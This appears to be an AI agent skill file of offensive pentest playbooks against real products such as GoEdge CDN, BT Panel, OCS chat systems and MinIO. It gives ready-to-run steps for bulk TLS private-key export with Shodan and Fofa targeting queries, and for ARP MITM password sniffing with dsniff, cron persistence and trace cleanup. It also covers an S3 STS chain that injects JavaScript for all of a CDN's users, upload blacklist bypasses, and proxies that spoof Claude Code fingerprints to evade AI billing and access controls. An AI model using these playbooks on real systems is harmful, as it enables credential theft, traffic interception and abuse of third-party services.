---
name: specialized-attack-playbooks
description: >-
  Topical real-world exploitation: GoEdge private-key export, gray-industry CDN forensics, ARP MITM, CDN→S3 STS chain, BT Panel + UniApp, AI IDE API reverse-proxy, OCS + MinIO; includes a references/scripts supporting-file index. Use when applying specialized playbooks for GoEdge, CDN, ARP MITM, BT Panel, OCS, MinIO.
metadata:
  tags: [pentest, penetration-testing, red-team]
---

## Topical Real-World Exploitation (all inline)

### GoEdge CDN (port 8002) bulk private-key export
```
Fingerprint: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → requires X-Cloud-Access-Token
Vulnerability: findEnabledSSLCertConfig only validates identity, not scope → any admin key can export the entire system's TLS private keys (keyData = plaintext PEM base64)
Two-step authentication: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
          Subsequent requests carry the header X-Cloud-Access-Token: <token>
Batch extraction (Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → r.json()['data']['sslCertJSON'] base64-decode → json → dnsNames + keyData (base64 PEM private key) | skip b64=="bnVsbA==" (null)
Assets: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
Exploit: private key → MITM/traffic decryption/forge certificates | reuse AK/SK credentials against other GoEdge instances | gain admin access to CDN edge nodes
```

### Gray-industry CDN post-exploitation forensics (after taking over the CDN, figure out what it is operating)
```
Five steps: ① fully enumerate certificates (ID 1-500; expired/disabled ones also contain private keys, revealing historical operations) ② initial keyword classification ③ real-access verification (crucial! do not trust the certificate domain alone,
      requests following redirects to see the final landing page's title/meta/h1/JS redirect) ④ re-classify by real content ⑤ mark high-value targets
Keyword matrix (dnsNames classification): wallet phishing tokenpocket/tokenpoket (letter-swap squatting)/metamask/trust | payment fraud paypal/wxpay/bayspay/147pay
  Adult paid site farms xiuren/xrw/sood/laikantu/tuhaokan/kantu | pirated film/TV 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN circumvention futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | wildcard site-farm SEO 0x000/tc7/vn00/fc000/ikkk (programmatic wildcard-resolution redirect chain) | lottery scam 0149/dh49/999pian (pian = scam)
High-value tagging: Grade A valid wallet/payment private keys → MITM/HTTPS phishing green lock | Grade B ACME auto-renewing certificates allow continuous monitoring | Grade C AK/SK credential reuse + WHOIS to correlate the operator's other assets
Identifying characteristics (🔴 very high): the same server mixes legitimate + pornographic + pirated content | large numbers of wildcard-site-farm wildcard certificates | a brand domain + a spoofed domain on the same CDN (insider-run phishing) | a single admin key can export all private keys (GoEdge has no isolation by default)
```

### ARP MITM to steal SSH passwords on the same L2 (target on the same subnet, password unknown)
```
Applicable when: the target is on the same L2 (same Hyper-V host/same VLAN) + you have a controlled pivot host + the target's SSH password is unknown
🚨 Key pitfall: arpspoof reports "couldn't arp for host" (libnet resolving the MAC often times out on Hyper-V/CentOS7)
  Fix: ip neigh replace {target IP} lladdr {target MAC} dev eth0 nud permanent (pre-fill the gateway the same way) → skips libnet resolution, and arpspoof works normally
Deployment: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof ×4 bidirectional (one process each for target↔gateway) | tcpdump -w x.pcap -s0 -C100 -W10 host {target}
  dsniff -i eth0 -w /tmp/dsniff.log (specifically captures SSH/FTP/HTTP plaintext passwords)
Persistence: crontab '*/2 * * * * /root/mitm_chk.sh' to backfill + rc.local for startup on boot
Verification: pgrep -c arpspoof==4 | tcpdump -r x.pcap to see whether the target's traffic was captured
Event notification: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (only notify when there's a catch: the script detects new content in the dsniff log → outputs to stdout → delivers; stays silent when there's nothing new)
Cleanup: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | remove the mitm line from crontab | ip neigh del each entry | rm pcap/log
```

### Multi-layer domain-rotation CDN anti-blocking system → S3 STS credential-escalation attack chain
```
Architecture identification: entry domain → JS redirect layer 1 (random subdomain + wildcard DNS) → redirect layer 2 → the real business site (static landing)
  CDN characteristics: Server: Xcdn | "Please access via the domain name" | 987dns.com domestic DNS scheduling (returns 0.0.0.0 abroad)
  Key breakthrough points:
    ① the real business site exposes a mainDomains list in its inline HTML JS (layer by layer) + base64-encoded sub-site redirect config
    ② the deepest landing page references origin resources outside the CDN (ug458.com/idcpc8.com, etc.) → bypass the CDN and hit the origin directly
    ③ the origin is S3 (AmazonS3 header/ListBucket public) → exposes the bucket name
    ④ the same site offers an APK download → reverse-engineer it to extract the API domain + AES key + STS acquisition path
    ⑤ register → log in → JWT → /BBS/GetSTSToken → AWS STS temporary credentials (PutObject permission)
    ⑥ S3 write = CDN origin tampering = JS injection for all users (equivalent to RCE)
  
  Technical details:
    AES-CBC encrypted API communication: the key is doubly exposed in the frontend JS (lazyDecryptImg.js) and the APK (.so strings)
    ASP.NET backend: identify from the validation error format + traceId | prefer form-urlencoded (JSON may return 415)
    Registration without verification: no SMS/no captcha/any phone number → bulk registration possible
    STS over-authorization: an ordinary user role obtains s3:PutObject → overwrite CDN origin files
    S3 bucket ListBucket public: the prefix parameter is ineffective (CDN cache), but connecting directly to the S3 domain allows full enumeration
  Reference: references/cdn-antiblock-s3-attack-chain.md
```

### BT Panel penetration + UniApp/DCloud APK reversing
```
=== BT Panel fingerprinting ===
Fingerprint: port 19362/8888/random high port + a cookie name containing a 32-char MD5 hash + "_ssl" suffix (e.g. 721301c19a31e887cb1f5a5726fbaae5_ssl)
  Set-Cookie appearing in a 404 response = confirms BT Panel; port 888 usually hosts phpMyAdmin (403 = IP whitelist)
Security entry: newer BT Panel enforces a random 8-character path (/xxxxxxxx/); without guessing it you cannot reach the panel. All API endpoints are behind the security-entry path.
  Brute-force strategy: domain-related variants (bt + domain prefix) + common ops habits (admin888/bt123456/btpanel) + 8 random characters (very low success rate)
  Bypass: no known general bypass (2024+); the older CVE-2023-38038 (phpmyadmin unauthorized) only affects <=7.7
  Lateral idea: multiple sites on the same IP share one BT Panel → find a weak site to break in → pivot laterally to the target site; BT Panel's default www user manages all sites

=== UniApp/DCloud APK reversing (highly efficient) ===
Identification: assets/dcloud_uniplugins.json + assets/apps/<appid>/ + uni-jsframework.js
Core: the business logic is entirely in the JS/Vue files under the assets/apps/<appid>/www/ directory (no need to decompile Java with jadx)
  API extraction: grep -r 'https\?://' assets/apps/ | filter baseURL/apiUrl/request config
  Authentication: search for token/key/secret/Authorization → hardcoded credentials are commonly in config.js/env.js/manifest.json
  Encryption: search for aes/encrypt/decrypt/sign → frontend encryption = effectively plaintext (the key must be in the JS)
  WebSocket: search for wss://ws:// → real-time communication backend address
Priority: manifest.json (appid/version/permissions) → config- or env-related JS (API addresses) → page JS (business logic/IDOR)

=== ChengZi site-builder (ChengZi/d3504.cn) SDK decryption ===
Scenario: porn/gray-industry APP distribution landing pages often use ChengZi for invitation-free signup + redirect + APK distribution
init3 endpoint: POST /web/<appkey>/<channel>/init3 → returns URL-safe base64-encoded XOR-encrypted data
Decryption: base64url_decode → byte-by-byte XOR 0x96 → JSON (contains fu=download URL, ph=installer path, fm=redirect method)
  Script: scripts/chengzi_decrypt.py
Exploit: decrypt to get the real APK's Aliyun FC-function URL → download the APK → reverse-engineer to extract the backend API
```

### AI IDE API reverse-proxy/key-leak catalog (discover and evaluate AI coding-tool reverse-proxy solutions)
```
Background: Cursor Web's free API has only gemini-3-flash left since 2026-04, Claude fully cut → getting Claude 4.6+ requires other channels
Available solutions: freemodel-cc-proxy (free, FreeModel real Claude, spoofs the Claude Code fingerprint to bypass 403, Opus4.8/Sonnet4.6) | WindsurfAPI (dwgx, Windsurf gRPC converted to an API, 100+ models, account-pool rotation)
  askalf/dario (converts a Claude Pro/Max subscription into an API, bypassing headless billing) | bypass/chatgpt-adapter (xllm-go, aggregates multiple reverse-engineered interfaces into OpenAI format)
Deprecated: cursor2api/cursor2api-go (only gemini-3-flash left) | auxiliary: claude-tap (MITM intercepts an AI agent's real traffic to study the system prompt/tool calls)
GitHub search method: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → filter by desc → /repos/<o>/<r>/readme (base64-decode and read) → /search/issues to check the latest status
Keywords: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### OCS online customer-service system penetration + MinIO object-storage exploitation
```
Discovering the entry: the landing page's HTML customer-service link exposes the OCS domain (e.g. leiyushan.com) → Playwright loads the SPA to intercept the real API calls
Authentication flow: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; subsequent request header x-v-token: <token>
Core APIs: /api/v1/v/bc (start chat) /api/v1/v/oss/sign (get an upload signature) /api/v1/v/message/send (send a message)
Upload chain: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  Request headers: sign=<sn>, expTime=<et>  form: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
Blacklist bypass (extensions outside the whitelist are blocked):
  ✓ .jsp.jpg (double extension, the last ext passes detection) ✓ .jsp%00.jpg (null-byte truncation) ✓ .jsp;.jpg (Tomcat path parameter)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ Files stored in MinIO object storage = static objects, not executed by Tomcat (must write into the webroot to achieve RCE)
  Verification: curl https://UL/bucket/dir/date/filename → returns the file content (plaintext, not executed)
dir parameter traversal: the sign service does not validate the dir content (always returns a fixed bucket sign); the upload service checks bucket permissions
  dir=conf → 500 (tries to write to the conf bucket but lacks permission) dir=../../ → 500 (traversal rejected)
MinIO Console (port 9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403=invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → fixed in new versions (returns BadRequest, does not leak env)
CDN layer identification (response-size fingerprint):
  CDN WAF block page ~2000 bytes | WSCN JS challenge page ~6000 bytes (Embed Iframe) | nginx 404 = 146 bytes
  Spring Boot JSON 404 ~100 bytes | Tomcat HTML 404 ~435 bytes
nginx method restriction: admin paths (/api/v1/a/ /api/v1/s/) allow only GET → POST returns 405
WSCN Wangsu CDN JS challenge: Playwright passes it automatically | the path whitelist is independent of the JS challenge (even after passing the challenge, the path ACL still blocks)
Spring Boot path traversal: /c/..;/path → bypass the nginx path ACL to reach Spring Boot (semicolon = Tomcat path-parameter truncation)
BT Panel entry: Set-Cookie leaks the cookie name → the entry path is a random 8 characters and cannot be deduced, only brute-force enumeration
Longteng CDN: the TLS certificate exposes all associated domains | the Server header exposes the origin OS version
```

## Supporting-File Index

```
=== references/ attack-chain write-ups ===
cdn-antiblock-s3-attack-chain.md        multi-layer domain-rotation CDN anti-blocking → S3 STS credential-escalation chain
faka-system-attack-chain.md             card-issuing system (XHFAKA/Xinghai) enumeration/second-order XSS/lockout bypass/WAF blind spots
ocs-im-system-attack-chain.md           OCS online customer-service IM system full attack chain
ocs-minio-upload-attack-chain.md        OCS upload → MinIO object-storage exploitation chain
chinese-app-distribution-pentest.md     domestic gray-industry APP distribution landing-page penetration (ChengZi/FC/CDN)
phpcms-v9-attack-surface.md             PHPCMS V9 attack surface

=== references/ CDN/Spring/WebSocket bypass ===
spring-boot-cdn-bypass.md               Spring Boot Actuator path traversal + interceptor bypass
cdn-waf-bypass-spring-boot.md           CDN WAF bypass (502/JS challenge) + Spring backend
cdn-bypass-gccdn-ocs.md                 GCCDN/Wangsu response-filtering bypass
cdn-websocket-bypass-spring-auth.md     WebSocket upgrade bypasses the CDN to reach Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN bypass
sockjs-stomp-exploitation.md            SockJS/STOMP privilege bypass + SpEL injection
spring-stomp-sockjs-exploitation.md     Spring STOMP authentication + unauthorized subscription

=== references/ nginx/PHP fingerprinting ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO deny bypass + response-size fingerprint
nginx-php-fingerprint-bypass.md            nginx/PHP-FPM fingerprint differential
nginx-404-differential-fingerprinting.md   catch-all vs real-404 differential enumeration

=== references/ APK reversing ===
uniapp-apk-reverse-engineering.md       UniApp/DCloud full reversing (JS/.so/.dat)
uniapp-apk-reversing.md                 UniApp reversing quick reference (RC4 deobfuscation + domain discovery)
uniapp-dcloud-apk-reversing.md          DCloud structure + HTTPDNS identification
bt-panel-attack-methodology.md          BT Panel fingerprinting + entry brute-force + lateral movement

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4+string-array-rotation deobfuscation (extract → node decode)
chengzi_decrypt.py          ChengZi site-builder init3 XOR decryption (fu download URL)
decrypt_aes_cbc_api.py      AES-CBC encrypted API-communication decryption template (hardcoded key/iv)
s3_sts_exploit.py           AWS S3 STS temporary-credential exploitation (verify/list/write/permission enumeration)
stomp_sockjs_exploit.py     STOMP over SockJS exploitation template (CDN bypass + authentication + injection)
spring_stomp_exploit.py     Spring STOMP unauthorized subscription/send
```

